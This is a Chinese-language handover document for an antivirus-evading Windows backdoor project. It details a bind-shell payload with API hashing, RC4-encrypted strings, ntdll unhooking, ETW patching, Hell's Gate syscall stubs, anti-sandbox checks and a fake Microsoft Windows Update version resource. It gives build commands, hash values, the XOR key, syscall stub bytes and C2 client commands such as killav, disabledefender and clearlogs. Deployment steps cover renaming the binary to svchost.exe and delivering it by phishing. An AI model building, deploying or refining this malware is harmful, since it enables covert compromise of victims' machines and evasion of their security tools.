# Bypass AV — 项目交接文档

## 项目概述

Windows 免杀 Bind Shell 项目。核心是一个使用 API 哈希 + RC4 字符串加密 + PEB 遍历解析导出的 C 语言 payload (`bypass.exe`)，在目标上开一个 XOR 加密的 TCP 反向 shell (端口 54321)。从外部用 Python/PowerShell 客户端连接。

**无需编译客户端**——客户端用纯脚本（Python / PowerShell），不存在杀软编译时删 exe 的问题。

---

## 项目结构

```
bypass_av/
├── main.c              # 主 payload (单文件, 全部内联)
├── byp.rc              # 资源文件 (版本信息: Microsoft / Windows Update, 盾牌图标)
│
├── build_bypass.bat    # 编译脚本 (x64)
├── rebuild_with_vps.bat# VPS 中继重编译脚本
│
├── tools/
│   ├── c2client.ps1    # PowerShell C2 客户端 (Win 目标, 免编译)
│   ├── c2client.py     # Python C2 客户端 (Kali/Linux)
│   └── c2client.c      # C 客户端源码 (已废弃, 火绒静态删除 exe)
│
├── firewall日志.txt     # 火绒历史检测记录
│
├── HANDOVER.md          # 本文件
├── bypass.exe           # 编译产物 (约 206KB)
└── WindowsUpdate.exe    # bypass.exe 的重命名副本
```

---

## 架构

```
┌─────────────────────┐         XOR 加密 TCP          ┌────────────────────┐
│  Windows Target     │     ────────────────→          │   Kali / Attacker  │
│                     │     ←───────────────           │                    │
│  bypass.exe (54321) │     port 54321                 │  c2client.py       │
│  - bind shell       │     key:                       │  (或 c2client.ps1) │
│  - XOR 加密通信      │     0x42 0x7A 0x1F 0xE3       │                    │
│  - API hashing      │     0x9C 0x55 0xB0 0x2D       │                    │
│  - RC4 字符串        │                                │                    │
└─────────────────────┘                                └────────────────────┘
```

### 通信流程

1. **服务端** (`main.c`): `bsh()` 函数
   - `LoadLibrary("ws2_32.dll")` → `WSAStartup` → `socket` → `bind` → `listen` → `accept`
   - 收到命令 → XOR 解密 → 写入 stdin pipe → cmd.exe 执行 → 读取 stdout pipe → XOR 加密 → send
   - **XOR 密钥**: `{0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D}` (8 字节循环)
   - **命令终止标记**: `echo __C2DONE__`（服务端只执行命令，客户端负责添加标记）

2. **客户端** (`c2client.py` / `c2client.ps1`):
   - 建立 TCP 连接 → 发送 `命令\r\necho __C2DONE__\r\n`（XOR 加密）→ 读取直到 `__C2DONE__` → 显示结果

---

## 免杀技术

### 静态免杀 (通过火绒静态扫描)

| 技术 | 说明 |
|------|------|
| **API Hashing (djb2)** | 所有敏感 API 通过 PEB 遍历 + djb2 哈希解析，IAT 中只有 `GetModuleHandleA`、`MessageBoxA`、`CreateThread`、`GetTickCount`、`Sleep` 等无害函数 |
| **RC4 字符串加密** | 关键字符串（`cmd.exe`、`notepad.exe`、弹窗文本等）用 RC4 加密，运行时解密 |
| **PEB 遍历导出** | 从 PEB 链表遍历已加载模块，解析 PE 导出表查找函数地址 |
| **文件体积填充** | 196KB `_padding[196608] = {1}` 数组放入 `.data` 段，增大文件体积改变哈希 |
| **Version 伪装** | 资源文件伪装为 Microsoft Corporation / Windows Update Assistant，带盾牌图标 |
| **反沙箱** | `is_dbg()` PEB BeingDebugged 检测；`is_sbx()` 判断开机时间 < 5 分钟 或 无用户输入 > 30 分钟 |
| **无 CRT** | `/NODEFAULTLIB` 编译，无 CRT 依赖，减小体积 |

### 动态/内存免杀

| 技术 | 说明 |
|------|------|
| **ntdll 脱钩 (Unhook)** | `CreateFileW` → `CreateFileMappingW` → `MapViewOfFile` 从磁盘读取干净 ntdll，覆盖内存中被 hook 的 `.text` 段 |
| **ETW 绕过** | 在 ntdll 中找到 `EtwEventWrite`，`VirtualProtect` RWX 后写入 `0xC3` (ret)，禁用 ETW |
| **Hell's Gate** | 从 ntdll 中扫描 `4C 8B D1 B8` 模式提取系统服务号 (SSN)，构建可执行 syscall stub 用于间接系统调用 |
| **XOR 流量加密** | 所有网络通信 XOR 加密，绕过网络流量特征检测 |

### 已移除的功能

- ~~**进程镂空 (exec_hollow)**~~: 注入自身 `.text` 到 notepad.exe 触发火绒内存检测 `Backdoor/CobaltStrike.l`，已移除，直接 `CreateThread` 启动 bind shell

---

## 编译

### 环境要求

- Visual Studio Build Tools 2022 (x64 工具链)
- Windows SDK (10.0.26100.0)

### 编译命令

```bash
# 手动编译（先运行 vcvars 进 VS x64 环境）
cd <project_dir>
set VS2022_DIR=C:\VS2022   :: 改成你自己的 VS 安装路径
"%VS2022_DIR%\VC\Auxiliary\Build\vcvars64.bat"
rc /nologo byp.rc
cl /nologo /O1 /MT /GS- /GF main.c ^
    /link /NODEFAULTLIB kernel32.lib user32.lib advapi32.lib ws2_32.lib ^
    byp.res /MACHINE:X64 /SUBSYSTEM:WINDOWS /ENTRY:WinMain /OUT:bypass.exe
```

或用 `build_bypass.bat` 自动编译。

### 编译参数说明

| 参数 | 说明 |
|------|------|
| `/O1` | 最小体积优化 |
| `/MT` | 静态链接 CRT (实际 `/NODEFAULTLIB` 禁用了 CRT) |
| `/GS-` | 禁用缓冲区安全检查 |
| `/GF` | 字符串合并 |
| `/NODEFAULTLIB` | 不链接默认库 (所有 CRT 函数禁用) |
| `/SUBSYSTEM:WINDOWS` | GUI 子系统 (无控制台窗口) |
| `/ENTRY:WinMain` | 入口点为 WinMain |

---

## 客户端使用

### Windows 端 (PowerShell)

```powershell
# 直接运行 (默认 127.0.0.1:54321)
powershell -File tools\c2client.ps1

# 指定 IP 和端口
powershell -File tools\c2client.ps1 -Ip 192.168.30.17 -Port 54321
```

**支持的命令**: `help`, `connect`, `disconnect`, `sysinfo`, `ps`, `shell` (交互式), `cmd`, `escalate`, `killav`, `disabledefender`, `clearlogs`, `persist`, `wifi`, `screenshot`, `exit`

### Kali / Linux 端 (Python3)

```bash
# 安装 (可选)
chmod +x tools/c2client.py

# 单条命令
python3 tools/c2client.py 192.168.30.17 54321

# 退出: exit / quit / q
```

### 原始测试 (ncat / 无 XOR)

如果暂时关闭 XOR，可以用 nc 直接测试连通性（仅限调试）：
```bash
echo "whoami" | ncat -nv 192.168.30.17 54321
```

---

## 部署

1. **编译** `bypass.exe`
2. **重命名** 为 `wuauclt.exe`、`WindowsUpdate.exe`、`svchost.exe` 等系统名称
3. **投递到目标** (钓鱼 / 捆绑 / 其他方式)
4. **运行** 等待约 12 秒（反沙箱延时 + ntdll 脱钩 + ETW 补丁）
5. **监听** 端口 54321 (可修改 `main.c:406` 中的 `port` 变量)
6. **连接** 使用 `c2client.py` 或 `c2client.ps1`

### VPS 中继 (FRP)

如果目标在内网，需要 VPS 转发：
1. 在 VPS 上运行 frp server (frps)
2. 修改 rebuild_with_vps.bat 中的 IP 和端口
3. 重编译包含 frpc 的 payload

---

## 已知问题

1. **c2client.exe 编译**: 火绒 `Backdoor/Meterpreter.b` 签名检测导致 link.exe 删 exe。解决方案：改用 `.ps1` / `.py` 脚本

2. **进程镂空内存检测**: 注入 notepad.exe 时，火绒 `Backdoor/CobaltStrike.l` 检测到 4KB shellcode 在 0x699D0000。已移除该功能

3. **网络流量**: 火绒 `Backdoor/WinCMD` 检测未加密流量。已用 XOR 加密解决

4. **中文字符编码**: cmd.exe 输出 GBK 编码，Python 客户端尝试 gbk 解码，少量字符可能显示为乱码

5. **单连接**: bind shell 一次只能服务一个客户端，断开后可重新连接

---

## 技术细节

### 哈希值参考

| 名称 | djb2 哈希 |
|------|-----------|
| **模块** | |
| ntdll.dll | `0x1EDAB0ED` |
| kernel32.dll | `0x6DDB9555` |
| ws2_32.dll | `0x89F03A6F` |
| user32.dll | `0x2208CF13` |
| **kernel32 函数** | |
| GetProcAddress | `0xCF31BB1F` |
| GetModuleHandleA | `0x5A153F58` |
| CreateProcessA | `0xAEB52E19` |
| CreatePipe | `0x9A8DEEE7` |
| WriteFile | `0x663CECB0` |
| ReadFile | `0x71019921` |
| VirtualProtect | `0x844FF18D` |
| **ws2_32 函数** | |
| WSAStartup | `0x6128C683` |
| socket | `0x1C31032E` |
| bind | `0x7C9499E2` |
| listen | `0x0B794014` |
| accept | `0xF15AE9B5` |
| recv | `0x7C9D4D95` |
| send | `0x7C9DDB4F` |

> **djb2 算法**: `h=5381; for each byte: h = ((h<<5)+h)+byte`
> 模块名: 大写不敏感 (转大写后哈希)
> 函数名: 大小写敏感

### SSN (系统服务号) 提取

在 ntdll 中扫描 `0x4C 0x8B 0xD1 0xB8` (x64) 或 `0xB8 ... 0xCD 0x2E` (x86) 模式找到 syscall 指令，读取 SSN 值。

### Syscall Stub 构建

```c
BYTE stub[] = {
    0x4C, 0x8B, 0xD1,        // mov r10, rcx
    0xB8, SSN, 0x00, 0x00, 0x00,  // mov eax, SSN
    0x0F, 0x05,              // syscall
    0xC3                     // ret
};
```

通过 `VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)` 分配可执行内存后写入。

### XOR 密钥

```c
BYTE c[] = {0x42, 0x7A, 0x1F, 0xE3, 0x9C, 0x55, 0xB0, 0x2D};
// 循环 8 字节异或
```

同时存在于 `main.c` (bsh 服务端) 和客户端脚本 (`c2client.py`/`c2client.ps1`) 中，必须保持一致。

---

## 测试清单

- [ ] 编译 bypass.exe 无错误
- [ ] 运行后 12 秒内端口 54321 开始监听
- [ ] 本地 Python 客户端连接并执行 `whoami` / `ipconfig`
- [ ] 关闭火绒静态扫描测试 (bypass.exe 不被删除)
- [ ] 开启火绒内存扫描测试 (不触发 CobaltStrike)
- [ ] 开启火绒网络扫描测试 (XOR 流量不被检测)
- [ ] Kali 远程连接测试 (192.168.30.15 → 192.168.30.17)

---

## TODO / 可能改进

- [ ] **c2client 功能合并到 bypass.exe**: 加 `--c2 <ip> <port>` 命令行模式，内部 AllocConsole 运行 C2
- [ ] **动态 XOR 密钥**: 每次连接生成随机密钥，避免固定特征
- [ ] **进程镂空恢复**: 如果能解决 XOR 解密注入的 shellcode 不被检测到
- [ ] **FRP 隧道**: 编写自动部署脚本，内网穿透
- [ ] **多线程支持**: 同时处理多个客户端连接
- [ ] **自动重连**: 反向连接模式 (reverse shell) 替代 bind shell
- [ ] **内存保护**: 敏感数据 (解密后的字符串) 用 `VirtualProtect` 加密/解密
- [ ] **反内存 dump**: 关键函数执行后擦除

---

## 历史检测记录

记录于 `firewall日志.txt`：

| 检测名 | 病毒 ID | 触发场景 | 状态 |
|--------|---------|----------|------|
| `Backdoor/Meterpreter.b` | 87F03F864B4BA077 | c2client.exe 编译 (link.exe 删除) | ⚠️ 未解决，改用脚本 |
| `Backdoor/CobaltStrike.l` | 7E662B652271E28F | 进程镂空注入 notepad.exe 后内存扫描 | ✅ 已移除 hollow |
| `Backdoor/WinCMD` | — | 未加密 plaintext 网络流量 | ✅ 已用 XOR 加密 |

---

*最后更新: 2026-07-10*
